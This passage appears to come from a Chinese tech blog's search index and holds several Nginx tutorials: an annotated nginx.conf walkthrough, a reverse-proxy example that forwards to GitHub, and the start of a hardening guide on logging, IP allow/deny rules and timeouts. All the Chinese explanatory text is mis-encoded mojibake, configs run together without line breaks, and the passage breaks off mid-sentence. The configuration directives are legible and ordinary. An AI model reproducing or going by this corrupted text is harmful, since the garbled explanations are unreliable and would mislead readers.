#æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨default_type application/octet-stream; #é»˜è®¤æ–‡ä»¶ç±»å‹include /usr/local/nginx/conf/proxy.conf; #charset utf-8; #é»˜è®¤ç¼–ç # log_format main '$remote_addr - $remote_user [$time_local] \"$request\" '# '$status $body_bytes_sent \"$http_referer\" '# '\"$http_user_agent\" \"$http_x_forwarded_for\"';# é»˜è®¤çš„nginxæ—¥å¿—æ ¼å¼ server_names_hash_bucket_size 128; #æœåŠ¡å™¨åå­—çš„hashè¡¨å¤§å°client_header_buffer_size 32k; #ä¸Šä¼ æ–‡ä»¶å¤§å°é™åˆ¶large_client_header_buffers 4 64k; #è®¾å®šè¯·æ±‚ç¼“client_max_body_size 8m; #è®¾å®šè¯·æ±‚ç¼“sendfile on; #å¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼ŒsendfileæŒ‡ä»¤æŒ‡å®šnginxæ˜¯å¦è°ƒç”¨sendfileå‡½æ•°æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨è®¾ä¸º onï¼Œå¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸ºoffï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„è´Ÿè½½ã€‚æ³¨æ„ï¼šå¦‚æœå›¾ç‰‡æ˜¾ç¤ºä¸æ­£å¸¸æŠŠè¿™ä¸ªæ”¹æˆoffã€‚autoindex on; #å¼€å¯ç›®å½•åˆ—è¡¨è®¿é—®ï¼Œåˆé€‚ä¸‹è½½æœåŠ¡å™¨ï¼Œé»˜è®¤å…³é—­ã€‚tcp_nopush on; #é˜²æ­¢ç½‘ç»œé˜»å¡tcp_nodelay on; #é˜²æ­¢ç½‘ç»œé˜»å¡keepalive_timeout 120; #é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’#keepalive è¶…æ—¶æ—¶é—´ï¼Œå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¿æ¥æŒç»­æœ‰æ•ˆæ—¶é—´å½“å‡ºç°å¯¹æœåŠ¡å™¨åï¼Œç»§ç»­è¯·æ±‚æ—¶keepalive_timeoutåŠŸèƒ½å¯é¿å…å»ºç«‹æˆ–è€…é‡æ–°ã€‚#FastCGIç›¸å…³å‚æ•°æ˜¯ä¸ºäº†æ”¹å–„ç½‘ç«™çš„æ€§èƒ½ï¼šå‡å°‘èµ„æºå ç”¨ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ä¸‹é¢å‚æ•°çœ‹å­—é¢æ„æ€éƒ½èƒ½ç†è§£ã€‚fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzipæ¨¡å—è®¾ç½®gzip on; #å¼€å¯gzipå‹ç¼©è¾“å‡ºgzip_min_length 1k; #æœ€å°å‹ç¼©æ–‡ä»¶å¤§å°gzip_buffers 4 16k; #å‹ç¼©ç¼“å†²åŒºgzip_http_version 1.0; #å‹ç¼©ç‰ˆæœ¬ï¼ˆé»˜è®¤1.1ï¼Œå‰ç«¯å¦‚æœæ˜¯squid2.5è¯·ä½¿ç”¨1.0ï¼‰gzip_comp_level 2; #å‹ç¼©ç­‰çº§gzip_types text/plain application/x-javascript text/css application/xml;#å‹ç¼©ç±»å‹ï¼Œé»˜è®¤å°±å·²ç»åŒ…å«text/htmlï¼Œæ‰€ä»¥ä¸‹é¢å°±ä¸ç”¨å†å†™äº†ï¼Œå†™ä¸Šå»ä¹Ÿä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€ä¸ªwarnã€‚gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #å¼€å¯é™åˆ¶IPè¿æ¥æ•°çš„æ—¶å€™éœ€è¦ä½¿ç”¨upstream blog.yangcvo.com &#123;#upstreamçš„è´Ÿè½½å‡è¡¡ï¼Œweightæ˜¯æƒé‡ï¼Œå¯ä»¥æ ¹æ®æœºå™¨é…ç½®å®šä¹‰æƒé‡ã€‚weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ã€‚server 192.168.80.121:80 weight=3 max_fails=2 fail_timeout=30s;server 192.168.80.122:80 weight=2 max_fails=2 fail_timeout=30s;server 192.168.80.123:80 weight=3 max_fails=2 fail_timeout=30s;&#125;#è™šæ‹Ÿä¸»æœºçš„é…ç½®server&#123;#ç›‘å¬ç«¯å£listen 80;#åŸŸåå¯ä»¥æœ‰å¤šä¸ªï¼Œç”¨ç©ºæ ¼éš”å¼€server_name www.yangcvo.com ; ##(æœåŠ¡å™¨å)index index.html index.htm index.php;root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fastcgi.conf;&#125;#å›¾ç‰‡ç¼“å­˜æ—¶é—´è®¾ç½®location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JSå’ŒCSSç¼“å­˜æ—¶é—´è®¾ç½®location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#æ—¥å¿—æ ¼å¼è®¾å®šlog_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#å®šä¹‰æœ¬è™šæ‹Ÿä¸»æœºçš„è®¿é—®æ—¥å¿—access_log /var/log/nginx/access.log access;#å¯¹ \"/\" å¯ç”¨åå‘ä»£ç†location / &#123;proxy_pass http://127.0.0.1:88;proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®ï¼Œå¯é€‰ã€‚proxy_set_header Host $host;client_max_body_size 10m; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•°client_body_buffer_size 128k; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œproxy_connect_timeout 90; #nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶)proxy_send_timeout 90; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶)proxy_read_timeout 90; #è¿æ¥æˆåŠŸåï¼Œåç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶)proxy_buffer_size 4k; #è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å°proxy_buffers 4 32k; #proxy_buffersç¼“å†²åŒºï¼Œç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è®¾ç½®proxy_busy_buffers_size 64k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰proxy_temp_file_write_size 64k;#è®¾å®šç¼“å­˜æ–‡ä»¶å¤¹å¤§å°ï¼Œå¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼ &#125;#è®¾å®šæŸ¥çœ‹NginxçŠ¶æ€çš„åœ°å€location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswdæ–‡ä»¶çš„å†…å®¹å¯ä»¥ç”¨apacheæä¾›çš„htpasswdå·¥å…·æ¥äº§ç”Ÿã€‚&#125;#æœ¬åœ°åŠ¨é™åˆ†ç¦»åå‘ä»£ç†é…ç½®#æ‰€æœ‰jspçš„é¡µé¢å‡äº¤ç”±tomcatæˆ–resinå¤„ç†location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#æ‰€æœ‰é™æ€æ–‡ä»¶ç”±nginxç›´æ¥è¯»å–ä¸ç»è¿‡tomcatæˆ–resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112user www www;worker_processes 2;error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid logs/nginx.pid;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; include /usr/local/nginx/conf/proxy.conf; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzipå‹ç¼©åŠŸèƒ½è®¾ç½® gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy è®¾ç½® client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # è®¾å®šè´Ÿè½½å‡è¡¡åå°æœåŠ¡å™¨åˆ—è¡¨ upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # å¾ˆé‡è¦çš„è™šæ‹Ÿä¸»æœºé…ç½® server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #å¯¹ / æ‰€æœ‰åšè´Ÿè½½å‡è¡¡+åå‘ä»£ç† location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #é™æ€æ–‡ä»¶ï¼Œnginxè‡ªå·±å¤„ç†ï¼Œä¸å»backendè¯·æ±‚tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;","link":"/2016/03/29/WebæœåŠ¡æŠ€æœ¯/Nginx/NginxåŸºç¡€ç¯‡-Nginx.confé…ç½®æ–‡ä»¶è¯¦è§£/"},{"title":"Nginx+Tomcatå®ç°åå‘ä»£ç†ä¼˜åŒ–ä¸é…ç½®","text":"Nginx+Tomcatå®ç°åå‘ä»£ç†ä»€ä¹ˆæ˜¯åå‘ä»£ç†åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰æ–¹å¼æ˜¯æŒ‡ç”¨ä»£ç†æœåŠ¡å™¨æ¥æ¥å— internet ä¸Šçš„è¿æ¥è¯·æ±‚ï¼Œç„¶åå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»æœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æœè¿”å›ç»™ internet ä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œä¸€ä¸ªç”¨æˆ·è®¿é—® http://www.example.com/readmeï¼Œä½†æ˜¯ www.example.com ä¸Šå¹¶ä¸å­˜åœ¨ readme é¡µé¢ï¼Œå®ƒæ˜¯å·å·ä»å¦å¤–ä¸€å°æœåŠ¡å™¨ä¸Šå–å›æ¥ï¼Œç„¶åä½œä¸ºè‡ªå·±çš„å†…å®¹è¿”å›ç»™ç”¨æˆ·ã€‚ä½†æ˜¯ç”¨æˆ·å¹¶ä¸çŸ¥æƒ…è¿™ä¸ªè¿‡ç¨‹ã€‚å¯¹ç”¨æˆ·æ¥è¯´ï¼Œå°±åƒæ˜¯ç›´æ¥ä» www.example.com è·å– readme é¡µé¢ä¸€æ ·ã€‚è¿™é‡Œæ‰€æåˆ°çš„ www.example.com è¿™ä¸ªåŸŸåå¯¹åº”çš„æœåŠ¡å™¨å°±è®¾ç½®äº†åå‘ä»£ç†åŠŸèƒ½ã€‚ åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå¯¹äºå®¢æˆ·ç«¯è€Œè¨€å®ƒå°±åƒæ˜¯åŸå§‹æœåŠ¡å™¨ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯ä¸éœ€è¦è¿›è¡Œä»»ä½•ç‰¹åˆ«çš„è®¾ç½®ã€‚å®¢æˆ·ç«¯å‘åå‘ä»£ç†çš„å‘½åç©ºé—´(name-space)ä¸­çš„å†…å®¹å‘é€æ™®é€šè¯·æ±‚ï¼Œæ¥ç€åå‘ä»£ç†å°†åˆ¤æ–­å‘ä½•å¤„(åŸå§‹æœåŠ¡å™¨)è½¬äº¤è¯·æ±‚ï¼Œå¹¶å°†è·å¾—çš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå°±åƒè¿™äº›å†…å®¹åŸæœ¬å°±æ˜¯å®ƒè‡ªå·±çš„ä¸€æ ·ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åå‘ä»£ç†å…¸å‹åº”ç”¨åœºæ™¯åå‘ä»£ç†çš„å…¸å‹ç”¨é€”æ˜¯å°†é˜²ç«å¢™åé¢çš„æœåŠ¡å™¨æä¾›ç»™ Internet ç”¨æˆ·è®¿é—®ï¼ŒåŠ å¼ºå®‰å…¨é˜²æŠ¤ã€‚åå‘ä»£ç†è¿˜å¯ä»¥ä¸ºåç«¯çš„å¤šå°æœåŠ¡å™¨æä¾›è´Ÿè½½å‡è¡¡ï¼Œæˆ–ä¸ºåç«¯è¾ƒæ…¢çš„æœåŠ¡å™¨æä¾› ç¼“å†² æœåŠ¡ã€‚å¦å¤–ï¼Œåå‘ä»£ç†è¿˜å¯ä»¥å¯ç”¨é«˜çº§ URL ç­–ç•¥å’Œç®¡ç†æŠ€æœ¯ï¼Œä»è€Œä½¿å¤„äºä¸åŒ web æœåŠ¡å™¨ç³»ç»Ÿçš„ web é¡µé¢åŒæ—¶å­˜åœ¨äºåŒä¸€ä¸ª URL ç©ºé—´ä¸‹ã€‚ Nginx çš„å…¶ä¸­ä¸€ä¸ªç”¨é€”æ˜¯åš HTTP åå‘ä»£ç†ï¼Œä¸‹é¢ç®€å•ä»‹ç» Nginx ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨çš„æ–¹æ³•ã€‚ åœºæ™¯æè¿°ï¼šè®¿é—®æœ¬åœ°æœåŠ¡å™¨ä¸Šçš„ README.md æ–‡ä»¶ http://localhost/README.mdï¼Œæœ¬åœ°æœåŠ¡å™¨è¿›è¡Œåå‘ä»£ç†ï¼Œä» https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md è·å–é¡µé¢å†…å®¹ã€‚ nginx.conf é…ç½®ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647worker_processes 1;pid logs/nginx.pid;error_log logs/error.log warn;events &#123; worker_connections 3000;&#125;http &#123; include mime.types; server_tokens off; ## ä¸‹é¢é…ç½®åå‘ä»£ç†çš„å‚æ•° server &#123; listen 80; ## 1. ç”¨æˆ·è®¿é—® http://ip:portï¼Œåˆ™åå‘ä»£ç†åˆ° https://github.com location / &#123; proxy_pass https://github.com; proxy_redirect off; ##proxy_redirect å…¶ä½œç”¨æ˜¯å¯¹å‘é€ç»™å®¢æˆ·ç«¯çš„ URL è¿›è¡Œä¿®æ”¹ã€‚ proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; ##åç«¯çš„ Web æœåŠ¡å™¨å¯ä»¥é€šè¿‡ X-Forwarded-For è·å–ç”¨æˆ·çœŸå® IP &#125;#ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®,å¯é€‰ã€‚ proxy_set_header Host $host; æ³¨æ„: â€œproxy_set_headerâ€å½“æˆ‘ä»¬çš„ RS æœ‰å¤šä¸ªè™šæ‹Ÿä¸»æœº(ç›¸åŒçš„ ip,ç›¸åŒçš„ç«¯å£)çš„ æ—¶å€™å¦‚ wwwã€bbsã€blog,ä»£ç†æœåŠ¡å™¨æ€ä¹ˆçŸ¥é“å°†è¯·æ±‚å‘åˆ°å“ªå‘¢,è¿™ä¸ªæ—¶å€™ nginx ä»£ ç†å°±ä¼šæŸ¥æ‰¾ proxy_set_header å‚æ•°,å°†è¯·æ±‚å‘é€åˆ°ç›¸åº”åŸŸåçš„è™šæ‹Ÿä¸»æœºä¸Šã€‚client_max_body_size 10m; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•° client_body_buffer_size 128k; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•°, proxy_connect_timeout 90; #nginx è·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶)proxy_send_timeout 90; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶) proxy_read_timeout 90; #è¿æ¥æˆåŠŸå,åç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶) proxy_buffer_size 4k; #è®¾ç½®ä»£ç†æœåŠ¡å™¨(nginx)ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å° proxy_buffers 4 32k; #proxy_buffers ç¼“å†²åŒº,ç½‘é¡µå¹³å‡åœ¨ 32k ä»¥ä¸‹çš„è®¾ç½® proxy_busy_buffers_size 64k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°(proxy_buffers*2) proxy_temp_file_write_size 64k; ## 2.ç”¨æˆ·è®¿é—® http://ip:port/README.mdï¼Œåˆ™åå‘ä»£ç†åˆ° ## https://github.com/.../README.md location /README.md &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md; &#125; &#125;&#125; æˆåŠŸå¯åŠ¨ nginx åï¼Œæˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨ï¼ŒéªŒè¯ä¸‹åå‘ä»£ç†çš„æ•ˆæœã€‚åœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥ localhost/README.mdï¼Œè¿”å›çš„ç»“æœæ˜¯æˆ‘ä»¬ github æºä»£ç . æˆ‘ä»¬åªéœ€è¦é…ç½®ä¸€ä¸‹ nginx.conf æ–‡ä»¶ï¼Œä¸ç”¨å†™ä»»ä½• web é¡µé¢ï¼Œå°±å¯ä»¥å·å·åœ°ä»åˆ«çš„æœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªé¡µé¢è¿”å›ç»™ç”¨æˆ·ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ nginx.conf é‡Œç”¨åˆ°çš„é…ç½®é¡¹ï¼š ï¼ˆ1ï¼‰location location é¡¹å¯¹è¯·æ±‚ URI è¿›è¡ŒåŒ¹é…ï¼Œlocation åé¢é…ç½®äº†åŒ¹é…è§„åˆ™ã€‚ä¾‹å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¦‚æœè¯·æ±‚çš„ URI æ˜¯ localhost/ï¼Œåˆ™ä¼šåŒ¹é… location / è¿™ä¸€é¡¹ï¼›å¦‚æœè¯·æ±‚çš„ URI æ˜¯ localhost/README.mdï¼Œåˆ™ä¼šåŒ¹é… location /README.md è¿™é¡¹ã€‚ ä¸Šé¢è¿™ä¸ªä¾‹å­åªæ˜¯é’ˆå¯¹ä¸€ä¸ªç¡®å®šçš„ URI åšäº†åå‘ä»£ç†ï¼Œæœ‰çš„è¯»è€…ä¼šæœ‰ç–‘æƒ‘ï¼šå¦‚æœå¯¹æ¯ä¸ªé¡µé¢éƒ½è¿›è¡Œè¿™æ ·çš„é…ç½®ï¼Œé‚£å°†ä¼šå¤§é‡é‡å¤ï¼Œèƒ½å¦åš æ‰¹é‡ é…ç½®å‘¢ï¼Ÿæ­¤æ—¶éœ€è¦é…åˆä½¿ç”¨ location çš„æ­£åˆ™åŒ¹é…åŠŸèƒ½ã€‚å…·ä½“å®ç°æ–¹æ³•å¯å‚è€ƒæœ¬ä¹¦çš„ URL åŒ¹é…ç« èŠ‚ã€‚ ï¼ˆ2ï¼‰proxy_pass proxy_pass åé¢è·Ÿç€ä¸€ä¸ª URLï¼Œç”¨æ¥å°†è¯·æ±‚åå‘ä»£ç†åˆ° URL å‚æ•°æŒ‡å®šçš„æœåŠ¡å™¨ä¸Šã€‚ä¾‹å¦‚æˆ‘ä»¬ä¸Šé¢ä¾‹å­ä¸­çš„ proxy_pass https://github.comï¼Œåˆ™å°†åŒ¹é…çš„è¯·æ±‚åå‘ä»£ç†åˆ° https://github.comã€‚ ï¼ˆ3ï¼‰proxy_set_header é»˜è®¤æƒ…å†µä¸‹ï¼Œåå‘ä»£ç†ä¸ä¼šè½¬å‘åŸå§‹è¯·æ±‚ä¸­çš„ Host å¤´éƒ¨ï¼Œå¦‚æœéœ€è¦è½¬å‘ï¼Œå°±éœ€è¦åŠ ä¸Šè¿™å¥ï¼šproxy_set_header Host $host; é™¤äº†ä¸Šé¢æåˆ°çš„å¸¸ç”¨é…ç½®é¡¹ï¼Œè¿˜æœ‰ proxy_redirectã€proxy_set_bodyã€proxy_limit_rate ç­‰å‚æ•°ï¼Œå…·ä½“ç”¨æ³•å¯ä»¥åˆ°Nginx å®˜ç½‘æŸ¥çœ‹ã€‚ ç¼“å­˜æŒ‡ä»¤ä¾èµ–ä»£ç†ç¼“å†²åŒº(buffers),å¦‚æœ proxy_buffers è®¾ç½®ä¸º off,ç¼“å­˜ä¸ä¼šç”Ÿæ•ˆã€‚ æ­£å‘ä»£ç†æ—¢ç„¶æœ‰åå‘ä»£ç†ï¼Œè‡ªç„¶ä¹Ÿæœ‰æ­£å‘ä»£ç†ã€‚ç®€å•æ¥è¯´ï¼Œæ­£å‘ä»£ç†å°±åƒä¸€ä¸ªè·³æ¿ï¼Œä¾‹å¦‚ä¸€ä¸ªç”¨æˆ·è®¿é—®ä¸äº†æŸç½‘ç«™ï¼ˆä¾‹å¦‚ www.google.comï¼‰ï¼Œä½†æ˜¯ä»–èƒ½è®¿é—®ä¸€ä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè¿™ä¸ªä»£ç†æœåŠ¡å™¨èƒ½è®¿é—® www.google.comï¼Œäºæ˜¯ç”¨æˆ·å¯ä»¥å…ˆè¿ä¸Šä»£ç†æœåŠ¡å™¨ï¼Œå‘Šè¯‰å®ƒéœ€è¦è®¿é—®çš„å†…å®¹ï¼Œä»£ç†æœåŠ¡å™¨å»å–å›æ¥è¿”å›ç»™ç”¨æˆ·ã€‚ä¾‹å¦‚ä¸€äº›å¸¸è§çš„ç¿»å¢™å·¥å…·ã€æ¸¸æˆä»£ç†å°±æ˜¯åˆ©ç”¨æ­£å‘ä»£ç†çš„åŸç†å·¥ä½œçš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¿™äº›æ­£å‘ä»£ç†å·¥å…·ä¸Šé…ç½®æœåŠ¡å™¨çš„ IP åœ°å€ç­‰ä¿¡æ¯ã€‚","link":"/2016/03/26/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginx+Tomcatå®ç°åå‘ä»£ç†ä¼˜åŒ–ä¸é…ç½® /"},{"title":"Nginx å®‰å…¨&ä¼˜åŒ–&æ—¥å¿—è¾“å‡ºè§„èŒƒè¯¦ç»†é…ç½®","text":"##1.Nginxæ—¥å¿—å®¡è®¡ â‘  å‚è€ƒé…ç½®æ“ä½œ(1)ç¼–è¾‘ nginx.conf é…ç½®æ–‡ä»¶ å°† error_log å‰çš„â€œ#â€å»æ‰ï¼Œè®°å½•é”™è¯¯æ—¥å¿—å°† access_log å‰çš„â€œ#â€å»æ‰ï¼Œè®°å½•è®¿é—®æ—¥å¿—(2)è®¾ç½® access_logï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 1234log_format formatname '$remote_addr - $remote_user [$time_local] '' \"$request\" $status $body_bytes_sent \"$http_referer\" '' \"$http_user_agent\" \"$http_x_forwarded_for\"'; access_loglogs/access.log formantname; #formatname æ˜¯è®¾ç½®é…ç½®æ–‡ä»¶æ ¼å¼çš„åç§° â‘¡ å¤‡æ³¨äº‹é¡¹æŸ¥çœ‹ nginx.conf é…ç½®æ–‡ä»¶ä¸­ï¼Œerror_logã€access_log å‰çš„â€œ#â€æ˜¯å¦å»æ‰0x02 æœåŠ¡1 é™åˆ¶ IP è®¿é—®å¯¹ç½‘ç«™æˆ–æ•æ„Ÿç›®å½•çš„è®¿é—® IP è¿›è¡Œé™åˆ¶â‘  å‚è€ƒé…ç½®æ“ä½œ(1)ä¿®æ”¹é…ç½®æ–‡ä»¶ vi /usr/local/nginx/conf/nginx.conf å…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š 12345location / &#123;deny 192.168.1.1; #æ‹’ç» IPallow 192.168.1.0/24; #å…è®¸ IPallow 10.1.1.0/16; #å…è®¸ IPdeny all; #æ‹’ç»å…¶ä»–æ‰€æœ‰ IP (2)é‡æ–°å¯åŠ¨ nginx æœåŠ¡ â‘¡ å¤‡æ³¨äº‹é¡¹æ ¹æ®åº”ç”¨åœºæ™¯ï¼Œè®¾ç½®åˆé€‚çš„ IP åœ°å€ï¼Œæ£€æŸ¥é…ç½®æ–‡ä»¶ #more /usr/local/nginx/conf/nginx.confä¸­çš„ 2.æ§åˆ¶è¶…æ—¶æ—¶é—´æ§åˆ¶è¶…æ—¶æ—¶é—´ï¼Œæé«˜æœåŠ¡å™¨æ€§èƒ½ï¼Œé™ä½å®¢æˆ·ç«¯çš„ç­‰å¾…æ—¶é—´ â‘  å»ºè®®é…ç½®(1)ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /usr/local/nginx/conf/nginx.conf å…·ä½“è®¾ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132client_body_timeout 10; #è®¾ç½®å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“è¯»å–è¶…æ—¶æ—¶é—´client_header_timeout 10; #è®¾ç½®å®¢æˆ·ç«¯è¯·æ±‚å¤´è¯»å–è¶…æ—¶æ—¶é—´keepalive_timeout 5 5; #ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå®¢æˆ·ç«¯è¿æ¥ä¿æŒæ´»åŠ¨çš„è¶…æ—¶æ—¶é—´ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå®ƒæŒ‡å®šäº†æ¶ˆæ¯å¤´ä¿æŒæ´»åŠ¨çš„æœ‰æ•ˆæ—¶é—´send_timeout 10; #æŒ‡å®šå“åº”å®¢æˆ·ç«¯çš„è¶…æ—¶æ—¶é—´(2)é‡æ–°å¯åŠ¨ nginx æœåŠ¡â‘¡ å¤‡æ³¨äº‹é¡¹éœ€è¦æ ¹æ®åº”ç”¨åœºæ™¯çš„éœ€è¦é€‰æ‹©åˆé€‚çš„å‚æ•°å€¼ã€‚1 ã€ç¬¦åˆæ€§åˆ¤å®šä¾æ®è¶…æ—¶åï¼ŒæœåŠ¡å™¨è¿”å›ç›¸åº”çš„æ¶ˆæ¯ã€‚2 